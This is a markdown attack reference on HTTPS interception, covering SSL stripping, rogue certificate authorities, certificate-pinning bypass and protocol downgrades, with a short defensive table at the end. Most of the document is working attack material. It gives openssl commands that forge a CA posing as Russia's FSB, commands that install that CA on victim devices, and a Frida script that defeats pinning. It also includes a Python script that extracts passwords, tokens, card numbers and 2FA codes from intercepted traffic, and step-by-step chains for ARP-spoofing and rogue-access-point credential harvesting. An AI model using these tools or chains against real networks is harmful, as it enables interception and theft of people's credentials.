# HTTPS Interception and Certificate Attacks

## Overview
HTTPS interception encompasses a range of techniques for breaking TLS encryption to capture, modify, or inspect traffic between a client and server. These techniques are fundamental to network penetration testing, mobile application security assessment, and red team operations.

## Attack Categories

### 1. SSL/TLS Stripping (Downgrade Attacks)
**Principle:** Prevent the TLS handshake from occurring by intercepting HTTP responses and rewriting HTTPS URLs to HTTP.

**Tools:** SSLStrip, Bettercap, mitmproxy

**Attack Flow:**
```
Victim → [HTTP] → Attacker (SSLStrip) → [HTTPS] → Real Server
         plaintext                        encrypted
```

The attacker sees all traffic in cleartext while maintaining a legitimate encrypted connection to the server. The victim's browser shows HTTP (no lock icon), but most users don't notice.

**Limitations:**
- HSTS preloaded sites (Google, Facebook, etc.) cannot be stripped
- Modern browsers display "Not Secure" warning for HTTP pages
- Does not work against apps with certificate pinning

### 2. Certificate Impersonation (Rogue CA)
**Principle:** Generate a fake CA certificate, install it on the victim's device, then generate valid-looking certificates for any domain on the fly.

**Attack Flow:**
```
Victim → [HTTPS with fake cert] → Attacker (mitmproxy) → [HTTPS with real cert] → Real Server
         encrypted with rogue CA                          encrypted with real CA
```

**Generating a Rogue CA:**
```bash
# Create CA private key
openssl genrsa -out ca.key 4096

# Create CA certificate (self-signed)
openssl req -new -x509 -days 3650 -key ca.key -out ca.crt \
    -subj "/C=RU/ST=Moscow/O=Federal Security Service/CN=Trusted Root Authority"

# Generate per-target certificate
openssl genrsa -out target.key 2048
openssl req -new -key target.key -out target.csr \
    -subj "/CN=mail.target.com"

# Sign with rogue CA (include SAN for modern browsers)
openssl x509 -req -in target.csr -CA ca.crt -CAkey ca.key \
    -CAcreateserial -out target.crt -days 365 \
    -extfile <(cat <<EOF
authorityKeyIdentifier=keyid,issuer
basicConstraints=CA:FALSE
keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment
subjectAltName = DNS:mail.target.com, DNS:*.target.com
EOF
)
```

**Installation Vectors:**
- Android: `adb push ca.crt /system/etc/security/cacerts/` (requires root)
- Windows: `certutil -addstore Root ca.crt` (requires admin)
- macOS: `security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ca.crt`
- Linux: `cp ca.crt /usr/local/share/ca-certificates/ && update-ca-certificates`
- iOS: Profile-based installation via Safari

### 3. Certificate Pinning Bypass
**Principle:** Disable the application's built-in certificate validation so it accepts the attacker's rogue certificate.

**Frida Universal SSL Pinning Bypass:**
```javascript
Java.perform(function() {
    // Android TrustManager bypass
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');

    var TrustManager = Java.registerClass({
        name: 'dev.bypass.TrustManager',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    var TrustManagers = [TrustManager.$new()];
    var sslContext = SSLContext.getInstance("TLS");
    sslContext.init(null, TrustManagers, null);

    // OkHttp3 bypass
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List')
            .implementation = function() {};
        CertificatePinner.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;')
            .implementation = function() {};
    } catch(e) {}

    // Retrofit / Volley / HttpsURLConnection
    try {
        var HttpsURLConnection = Java.use('javax.net.ssl.HttpsURLConnection');
        HttpsURLConnection.setDefaultSSLSocketFactory.implementation = function(factory) {
            this.setDefaultSSLSocketFactory(sslContext.getSocketFactory());
        };
        HttpsURLConnection.setDefaultHostnameVerifier.implementation = function(verifier) {};
    } catch(e) {}
});
```

**objection (automated pinning bypass):**
```bash
# Auto-bypass all certificate pinning
objection -g com.target.app explore -s "android sslpinning disable"
```

### 4. Protocol Downgrade Attacks
**Principle:** Force the TLS negotiation to use older, vulnerable protocol versions or weak cipher suites.

**POODLE (SSLv3 downgrade):**
```bash
# Test for SSLv3 support
openssl s_client -ssl3 -connect target.com:443

# Force SSLv3 via MITM
# Bettercap: set net.sniff.regexp '.*' ; set sslstrip.enabled true
```

**DROWN (cross-protocol SSLv2 attack):**
```bash
# Test for SSLv2 support (if found, RSA keys may be recoverable)
nmap --script ssl-enum-ciphers -p 443 target.com
```

**BEAST (CBC cipher exploitation):**
```bash
# Detect vulnerable CBC ciphers
testssl.sh --vulnerable target.com
```

## Secrets Extraction Reference

### What to Look For in Intercepted Traffic

| Location | Secret Type | Regex Pattern |
|----------|------------|---------------|
| POST body | Passwords | `pass(word)?=([^&]+)` |
| POST body | Usernames | `(user(name)?|email|login)=([^&]+)` |
| Headers | Bearer tokens | `Authorization:\s*Bearer\s+(\S+)` |
| Headers | Basic auth | `Authorization:\s*Basic\s+(\S+)` |
| Headers | API keys | `(X-API-Key|X-Auth-Token|Api-Key):\s*(\S+)` |
| Cookies | Session IDs | `(PHPSESSID|JSESSIONID|ASP\.NET_SessionId|connect\.sid)=(\S+)` |
| URL params | OAuth tokens | `(access_token|refresh_token|code)=([^&]+)` |
| POST body | CSRF tokens | `(csrf|_token|authenticity_token)=([^&]+)` |
| POST body | Credit cards | `\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b` |
| POST body | 2FA codes | `(otp|code|verification)=(\d{4,8})` |
| Headers | JWT tokens | `eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+` |
| POST body (JSON) | Any secret | `"(password|secret|token|key)":\s*"([^"]+)"` |

### Automated Extraction Script
```python
#!/usr/bin/env python3
"""Extract secrets from SSLStrip/mitmproxy logs."""
import re, sys, base64, json

PATTERNS = {
    'password_field': re.compile(r'(?:pass(?:word)?|pwd|passwd)=([^&\s]+)', re.I),
    'username_field': re.compile(r'(?:user(?:name)?|email|login|acct)=([^&\s]+)', re.I),
    'bearer_token': re.compile(r'Authorization:\s*Bearer\s+(\S+)', re.I),
    'basic_auth': re.compile(r'Authorization:\s*Basic\s+(\S+)', re.I),
    'api_key': re.compile(r'(?:X-API-Key|X-Auth-Token|Api-Key|x-api-key):\s*(\S+)', re.I),
    'session_cookie': re.compile(r'(?:PHPSESSID|JSESSIONID|session_id|connect\.sid|_session)=([^;\s]+)', re.I),
    'oauth_token': re.compile(r'(?:access_token|refresh_token|id_token)=([^&\s]+)', re.I),
    'jwt': re.compile(r'(eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+)'),
    'json_secret': re.compile(r'"(?:password|secret|token|apiKey|api_key|auth)":\s*"([^"]+)"'),
}

def extract_secrets(logfile):
    findings = {}
    with open(logfile) as f:
        for lineno, line in enumerate(f, 1):
            for name, pattern in PATTERNS.items():
                for match in pattern.finditer(line):
                    value = match.group(1)
                    if name == 'basic_auth':
                        try: value = base64.b64decode(value).decode()
                        except: pass
                    key = f"{name}:{value}"
                    if key not in findings:
                        findings[key] = lineno
                        print(f"[{name}] Line {lineno}: {value}")

if __name__ == '__main__':
    extract_secrets(sys.argv[1] if len(sys.argv) > 1 else 'sslstrip.log')
```

## Complete MITM Attack Chains

### Chain 1: Corporate Network Credential Harvest
```
1. Reconnaissance: nmap -sn 192.168.1.0/24 (find targets)
2. Network position: arpspoof -t target_ip gateway_ip
3. Traffic redirect: iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000
4. SSLStrip: sslstrip -l 10000 -w creds.log -f -k
5. Monitor: tail -f creds.log | grep -i pass
6. Post-exploit: use captured creds for lateral movement
```

### Chain 2: Mobile App API Token Theft
```
1. Launch Cuttlefish: cuttlefish_launch
2. Install target app: cuttlefish_install_apk
3. Generate rogue CA + install: cuttlefish_install_cert
4. Start mitmproxy: mitmproxy --mode transparent -p 8080
5. Set device proxy: cuttlefish_proxy set <host_ip> 8080
6. Bypass pinning: cuttlefish_frida_setup + pinning bypass script
7. Use app normally: cuttlefish_droidrun "Open app and log in"
8. Capture API tokens from mitmproxy flow
```

### Chain 3: Rogue Access Point
```
1. Create rogue AP: hostapd + dnsmasq (clone target SSID)
2. DHCP: assign attacker as gateway
3. IP forward: echo 1 > /proc/sys/net/ipv4/ip_forward
4. DNS spoof: dns2proxy for HSTS bypass
5. SSLStrip2: sslstrip2 -l 10000 -w creds.log
6. Capture credentials from all connected clients
```

## Defensive Countermeasures (For Blue Team Reference)

| Defense | Protects Against | Implementation |
|---------|-----------------|----------------|
| HSTS | SSL stripping | `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` |
| HSTS Preload | HSTS bypass | Submit to hstspreload.org |
| Certificate Pinning | Rogue CA | Pin certificate hash in app code |
| Certificate Transparency | Rogue certificates | CT logs detect unauthorized cert issuance |
| DNSSEC | DNS-based MITM | Signed DNS responses |
| 802.1X / NAC | ARP spoofing | Port-based network access control |
| DAI (Dynamic ARP Inspection) | ARP poisoning | Switch-level ARP validation |
| Mutual TLS (mTLS) | Impersonation | Client certificate authentication |
